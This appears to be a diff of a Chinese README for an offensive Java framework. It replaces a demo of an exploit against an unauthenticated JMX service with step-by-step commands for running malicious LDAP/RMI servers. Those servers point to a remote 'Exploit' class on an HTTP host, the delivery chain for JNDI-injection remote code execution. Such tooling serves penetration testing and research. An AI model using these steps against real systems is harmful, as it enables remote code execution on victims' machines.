@@ -28,58 +28,70 @@
 
 编译生成的jar包在`./build/libs/`
 
-### 2.2 默认server配置文件
+### 2.2 server使用案例
 
-```
-cp -r ./server ./build/libs/
-```
+1. 查看可创建服务
 
-这样是为了保证Joker可以找到相关的配置。
+    ```shell script
+     list server
+    ```
+2. 查看已经存在的服务
 
-### 2.3 运行
+    ```
+     list server_process
+    ```
 
-```
-java -jar ./build/libs/JokerFrameWork-1.0-SNAPSHOT.jar
-```
+3. 创建server session（也就是一个shellContext）用于接收存储参数
 
-就可以看到如下界面：
+    ```
+     server ldap
+    ```
+  
+4. 选择想要创建的服务
 
-![](./img/Joker.jpg)
+    ```
+     set serverName ldap-server
+    ```
+   
+5. 设置服务开启的url和端口信息：
 
-由于目前还有一些bug，所以`help`命令显示的并不完全，后续将重构展示界面这一部分的内容。
+    ldap默认`0.0.0.0:1389`
+    rmi默认`0.0.0.0:2000`
 
-## 0x03 测试例子
+    ```
+     set serverPort 8999
+    ```
 
-### 3.1 开启测试环境
+6. 设置必须参数：
 
-在`./server/http/jmx/`中内置了测试环境`jmx-server.jar`可以方便的用于演示。
+    ldap需要设置`remote_className`， `remote_FactoryLocation`
+    
+    rmi需要设置`remote_className`，`remote_FactoryName`，`remote_FactoryLocation`
+    
+    主要用于指定远程类名及地址。
+    
+    ```
+     set remote_className Exploit
+     set remote_FactoryLocation http://127.0.0.1:9999
+    ```
 
-命令行运行：
+7. 开启服务：
 
-```
-java -jar -Dcom.sun.management.jmxremote.port=23333 -Dcom.sun.management.jmxremote.authenticate=false -Dcom.sun.management.jmxremote.ssl=false -Djava.rmi.server.hostname=127.0.0.1 jmx-server.jar
-```
+    ```
+     run ldap
+    ```   
 
-会在本地`23333`端口开启一个`jmx`服务，该服务是没有设置用户登录的。
+8. 最后开启远程服务绑定自己的恶意类即可
 
-### 3.2 攻击测试
+最终效果：
 
-目前只是内置了一个攻击`jmx`未授权服务的exp，将用这个例子来演示如何使用。
+![](./img/jokerserver.jpg)
 
-`use`命令用于使用相关的`epxloit`，在使用`use`后可以使用help来查看可使用的命令：
+查看端口占用情况：
 
-![](./img/Jmx_1.jpg)
+![](./img/listserver_process.jpg)
 
-使用`set`命令设置值：
+## 3. next
 
-![](./img/Jmx_2.jpg)
-
-设置其他自定义参数：
-
-![](./img/Jmx_3.jpg)
-
-`exploit`命令开始攻击：
-
-![](./img/Jmx_4.jpg)
-
-![](./img/Jmx_5.jpg)
+1. 后续会进行文档编写，目前只是demo版本
+2. 调整框架结构，支持插件式热插拔
